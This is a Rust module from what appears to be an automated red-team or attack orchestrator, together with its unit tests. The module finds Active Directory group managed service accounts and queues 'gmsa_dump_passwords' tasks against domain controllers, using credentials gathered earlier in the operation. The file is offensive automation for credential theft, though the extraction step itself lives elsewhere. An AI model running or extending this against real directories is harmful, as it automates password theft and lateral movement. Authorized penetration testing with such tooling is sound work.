//! auto_gmsa_extraction -- dump gMSA passwords when gMSA accounts are found.
//!
//! Group Managed Service Accounts (gMSA) store their passwords in Active
//! Directory in the `msDS-ManagedPassword` attribute. Any principal with read
//! access can retrieve the plaintext password. When we discover users whose
//! names end with `$` and whose descriptions mention "managed service account"
//! (or via BloodHound gMSA edges), we dispatch `gmsa_dump_passwords`.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Returns `true` if the username and description indicate a gMSA account.
///
/// gMSA accounts typically end with `$` and have "managed service" in their
/// description, or their name contains "gmsa".
fn is_gmsa_account(username: &str, description: &str) -> bool {
    username.ends_with('$')
        && (description.to_lowercase().contains("managed service")
            || username.to_lowercase().contains("gmsa"))
}

/// Returns `true` if the vulnerability type is a gMSA candidate.
fn is_gmsa_vuln_type(vuln_type: &str) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "gmsa" || vtype == "gmsa_reader" || vtype == "readgmsapassword"
}

/// Monitors for gMSA accounts and dispatches password extraction.
/// Interval: 30s.
pub async fn auto_gmsa_extraction(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        let work: Vec<GmsaWork> = {
            let state = dispatcher.state.read().await;
            select_gmsa_work(&state)
        };
        if work.is_empty() {
            continue;
        }

        for item in work {
            let payload = build_gmsa_payload(&item);

            let priority = dispatcher.effective_priority("gmsa");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        gmsa_account = %item.gmsa_account,
                        domain = %item.domain,
                        "gMSA password dump dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GMSA_ACCOUNTS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GMSA_ACCOUNTS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(gmsa = %item.gmsa_account, "gMSA task deferred by throttler");
                }
                Err(e) => {
                    warn!(err = %e, gmsa = %item.gmsa_account, "Failed to dispatch gMSA dump")
                }
            }
        }
    }
}

pub(crate) struct GmsaWork {
    pub dedup_key: String,
    pub gmsa_account: String,
    pub domain: String,
    pub dc_ip: String,
    pub credential: ares_core::models::Credential,
}

/// Build the gMSA-account dedup key (`{domain}:{username}` lowercased).
pub(crate) fn gmsa_dedup_key(domain: &str, username: &str) -> String {
    format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
}

/// Select gMSA extraction work items for this tick.
///
/// Combines two discovery paths:
/// 1. **`state.users`** entries flagged as gMSA via `is_gmsa_account`
///    (username/description heuristic).
/// 2. **`state.discovered_vulnerabilities`** with a gMSA-related vuln_type
///    (BloodHound `ReadGMSAPassword` edges, etc.).
///
/// For each candidate the helper resolves a credential (same-domain reader
/// or fallback) and a DC IP. Skipped when state has no credentials at all,
/// or when the dedup key is already processed, or when no DC/cred is
/// resolvable. Pure — no Dispatcher.
pub(crate) fn select_gmsa_work(state: &StateInner) -> Vec<GmsaWork> {
    if state.credentials.is_empty() {
        return Vec::new();
    }

    let mut gmsa_accounts: Vec<GmsaWork> = Vec::new();
    let mut seen_accounts = std::collections::HashSet::new();

    for user in &state.users {
        if !is_gmsa_account(&user.username, &user.description) {
            continue;
        }
        let key = gmsa_dedup_key(&user.domain, &user.username);
        if state.is_processed(DEDUP_GMSA_ACCOUNTS, &key) || !seen_accounts.insert(key.clone()) {
            continue;
        }
        let cred = match state
            .credentials
            .iter()
            .find(|c| c.domain.to_lowercase() == user.domain.to_lowercase())
        {
            Some(c) => c.clone(),
            None => continue,
        };
        let Some(dc_ip) = state
            .domain_controllers
            .get(&user.domain.to_lowercase())
            .cloned()
        else {
            continue;
        };
        gmsa_accounts.push(GmsaWork {
            dedup_key: key,
            gmsa_account: user.username.clone(),
            domain: user.domain.clone(),
            dc_ip,
            credential: cred,
        });
    }

    for vuln in state.discovered_vulnerabilities.values() {
        if !is_gmsa_vuln_type(&vuln.vuln_type) {
            continue;
        }
        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
            continue;
        }

        let gmsa_account = match vuln
            .details
            .get("target")
            .or_else(|| vuln.details.get("gmsa_account"))
            .or_else(|| vuln.details.get("account_name"))
            .and_then(|v| v.as_str())
        {
            Some(a) => a.to_string(),
            None => continue,
        };

        let reader = vuln
            .details
            .get("source")
            .or_else(|| vuln.details.get("reader"))
            .and_then(|v| v.as_str());

        let domain = vuln
            .details
            .get("domain")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        let key = gmsa_dedup_key(&domain, &gmsa_account);
        if state.is_processed(DEDUP_GMSA_ACCOUNTS, &key) || !seen_accounts.insert(key.clone()) {
            continue;
        }

        let cred = reader
            .and_then(|r| {
                state.credentials.iter().find(|c| {
                    c.username.to_lowercase() == r.to_lowercase()
                        && (domain.is_empty() || c.domain.to_lowercase() == domain.to_lowercase())
                })
            })
            .or_else(|| {
                state.credentials.iter().find(|c| {
                    !domain.is_empty() && c.domain.to_lowercase() == domain.to_lowercase()
                })
            });

        let cred = match cred {
            Some(c) => c.clone(),
            None => continue,
        };

        let Some(dc_ip) = state
            .domain_controllers
            .get(&domain.to_lowercase())
            .cloned()
        else {
            continue;
        };

        gmsa_accounts.push(GmsaWork {
            dedup_key: key,
            gmsa_account,
            domain,
            dc_ip,
            credential: cred,
        });
    }

    gmsa_accounts
}

/// Build the JSON payload for a gMSA dump dispatch. Pure construction.
pub(crate) fn build_gmsa_payload(item: &GmsaWork) -> serde_json::Value {
    json!({
        "technique": "gmsa_dump_passwords",
        "target_ip": item.dc_ip,
        "domain": item.domain,
        "gmsa_account": item.gmsa_account,
        "credential": {
            "username": item.credential.username,
            "password": item.credential.password,
            "domain": item.credential.domain,
        },
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn is_gmsa_account_managed_service_description() {
        assert!(is_gmsa_account(
            "svc_web$",
            "Managed Service Account for web servers"
        ));
    }

    #[test]
    fn is_gmsa_account_gmsa_in_username() {
        assert!(is_gmsa_account("gmsa_svc$", "some service account"));
    }

    #[test]
    fn is_gmsa_account_case_insensitive_description() {
        assert!(is_gmsa_account(
            "svc_sql$",
            "MANAGED SERVICE account for SQL"
        ));
    }

    #[test]
    fn is_gmsa_account_case_insensitive_username() {
        assert!(is_gmsa_account("GMSA_SVC$", "regular account"));
    }

    #[test]
    fn is_gmsa_account_no_dollar_suffix() {
        // Must end with $
        assert!(!is_gmsa_account(
            "svc_web",
            "Managed Service Account for web"
        ));
    }

    #[test]
    fn is_gmsa_account_dollar_but_no_indicators() {
        // Ends with $ but no "managed service" in description and no "gmsa" in name
        assert!(!is_gmsa_account("svc_sql$", "regular computer account"));
    }

    #[test]
    fn is_gmsa_account_regular_user() {
        assert!(!is_gmsa_account("administrator", "Built-in admin account"));
    }

    #[test]
    fn is_gmsa_account_empty_description_with_gmsa_name() {
        assert!(is_gmsa_account("gmsa_backup$", ""));
    }

    #[test]
    fn is_gmsa_account_empty_description_without_gmsa_name() {
        assert!(!is_gmsa_account("svc_backup$", ""));
    }

    #[test]
    fn is_gmsa_vuln_type_gmsa() {
        assert!(is_gmsa_vuln_type("gmsa"));
    }

    #[test]
    fn is_gmsa_vuln_type_gmsa_reader() {
        assert!(is_gmsa_vuln_type("gmsa_reader"));
    }

    #[test]
    fn is_gmsa_vuln_type_readgmsapassword() {
        assert!(is_gmsa_vuln_type("readgmsapassword"));
    }

    #[test]
    fn is_gmsa_vuln_type_case_insensitive() {
        assert!(is_gmsa_vuln_type("GMSA"));
        assert!(is_gmsa_vuln_type("GMSA_READER"));
        assert!(is_gmsa_vuln_type("ReadGMSAPassword"));
    }

    #[test]
    fn is_gmsa_vuln_type_negative() {
        assert!(!is_gmsa_vuln_type("rbcd"));
        assert!(!is_gmsa_vuln_type("laps"));
        assert!(!is_gmsa_vuln_type("constrained_delegation"));
        assert!(!is_gmsa_vuln_type("esc1"));
        assert!(!is_gmsa_vuln_type("gmsa_something_else"));
        assert!(!is_gmsa_vuln_type(""));
    }

    #[test]
    fn dedup_gmsa_accounts_value() {
        assert_eq!(DEDUP_GMSA_ACCOUNTS, "gmsa_accounts");
    }

    #[test]
    fn dedup_key_format() {
        let domain = "contoso.local";
        let username = "gmsa_svc$";
        let key = format!("{}:{}", domain.to_lowercase(), username.to_lowercase());
        assert_eq!(key, "contoso.local:gmsa_svc$");
    }

    #[test]
    fn dedup_key_normalizes_case() {
        let key = format!(
            "{}:{}",
            "FABRIKAM.LOCAL".to_lowercase(),
            "GMSA_SVC$".to_lowercase()
        );
        assert_eq!(key, "fabrikam.local:gmsa_svc$");
    }

    // ── tests for select_gmsa_work / build_gmsa_payload / gmsa_dedup_key ──

    fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
        ares_core::models::Credential {
            id: format!("c-{user}-{domain}"),
            username: user.to_string(),
            password: password.to_string(),
            domain: domain.to_string(),
            source: String::new(),
            discovered_at: None,
            is_admin: false,
            parent_id: None,
            attack_step: 0,
        }
    }

    fn make_user(username: &str, domain: &str, description: &str) -> ares_core::models::User {
        ares_core::models::User {
            username: username.to_string(),
            domain: domain.to_string(),
            description: description.to_string(),
            is_admin: false,
            source: String::new(),
        }
    }

    fn make_gmsa_vuln(
        vuln_id: &str,
        target: &str,
        reader: Option<&str>,
        domain: &str,
    ) -> ares_core::models::VulnerabilityInfo {
        let mut details = std::collections::HashMap::new();
        details.insert("target".into(), serde_json::json!(target));
        if let Some(r) = reader {
            details.insert("source".into(), serde_json::json!(r));
        }
        details.insert("domain".into(), serde_json::json!(domain));
        ares_core::models::VulnerabilityInfo {
            vuln_id: vuln_id.to_string(),
            // is_gmsa_vuln_type accepts gmsa / gmsa_reader / readgmsapassword.
            vuln_type: "gmsa".into(),
            target: "192.168.58.10".into(),
            discovered_by: "test".into(),
            discovered_at: chrono::Utc::now(),
            details,
            recommended_agent: String::new(),
            priority: 1,
        }
    }

    // --- gmsa_dedup_key ----------------------------------------------

    #[test]
    fn gmsa_dedup_key_lowercases_inputs() {
        assert_eq!(
            gmsa_dedup_key("Contoso.Local", "GMSA_SVC$"),
            "contoso.local:gmsa_svc$"
        );
    }

    // --- select_gmsa_work --------------------------------------------

    #[test]
    fn select_gmsa_empty_state() {
        let s = StateInner::new("op".into());
        assert!(select_gmsa_work(&s).is_empty());
    }

    #[test]
    fn select_gmsa_returns_empty_when_no_credentials() {
        let mut s = StateInner::new("op".into());
        // gMSA detected but no credentials → fail-fast.
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_gmsa_work(&s).is_empty());
    }

    #[test]
    fn select_gmsa_emits_user_path() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_gmsa_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].gmsa_account, "gmsa_svc$");
        assert_eq!(work[0].domain, "contoso.local");
        assert_eq!(work[0].dc_ip, "192.168.58.10");
    }

    #[test]
    fn select_gmsa_skips_processed_user() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        s.mark_processed(
            DEDUP_GMSA_ACCOUNTS,
            gmsa_dedup_key("contoso.local", "gmsa_svc$"),
        );
        assert!(select_gmsa_work(&s).is_empty());
    }

    #[test]
    fn select_gmsa_emits_vuln_path() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        let v = make_gmsa_vuln("v1", "gmsa_svc$", Some("alice"), "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_gmsa_work(&s);
        assert_eq!(work.len(), 1);
        assert_eq!(work[0].gmsa_account, "gmsa_svc$");
        assert_eq!(work[0].credential.username, "alice");
    }

    #[test]
    fn select_gmsa_skips_exploited_vuln() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        let v = make_gmsa_vuln("v1", "gmsa_svc$", Some("alice"), "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.exploited_vulnerabilities.insert("v1".into());
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_gmsa_work(&s).is_empty());
    }

    #[test]
    fn select_gmsa_dedupes_user_and_vuln_paths() {
        // Same gMSA appears in both users and vulnerabilities — emit once.
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        let v = make_gmsa_vuln("v1", "gmsa_svc$", Some("alice"), "contoso.local");
        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        let work = select_gmsa_work(&s);
        assert_eq!(work.len(), 1);
    }

    #[test]
    fn select_gmsa_skips_user_path_without_dc() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "contoso.local"));
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        // No domain_controllers entry → skip.
        assert!(select_gmsa_work(&s).is_empty());
    }

    #[test]
    fn select_gmsa_skips_user_path_without_same_domain_cred() {
        let mut s = StateInner::new("op".into());
        s.credentials
            .push(make_cred("alice", "Pw", "fabrikam.local"));
        s.users.push(make_user(
            "gmsa_svc$",
            "contoso.local",
            "Managed Service Account",
        ));
        s.domain_controllers
            .insert("contoso.local".into(), "192.168.58.10".into());
        assert!(select_gmsa_work(&s).is_empty());
    }

    // --- build_gmsa_payload -------------------------------------------

    #[test]
    fn build_gmsa_payload_fields() {
        let item = GmsaWork {
            dedup_key: "contoso.local:gmsa_svc$".into(),
            gmsa_account: "gmsa_svc$".into(),
            domain: "contoso.local".into(),
            dc_ip: "192.168.58.10".into(),
            credential: make_cred("alice", "Pw1!", "contoso.local"),
        };
        let p = build_gmsa_payload(&item);
        assert_eq!(p["technique"], "gmsa_dump_passwords");
        assert_eq!(p["target_ip"], "192.168.58.10");
        assert_eq!(p["domain"], "contoso.local");
        assert_eq!(p["gmsa_account"], "gmsa_svc$");
        assert_eq!(p["credential"]["username"], "alice");
        assert_eq!(p["credential"]["password"], "Pw1!");
        assert_eq!(p["credential"]["domain"], "contoso.local");
    }
}
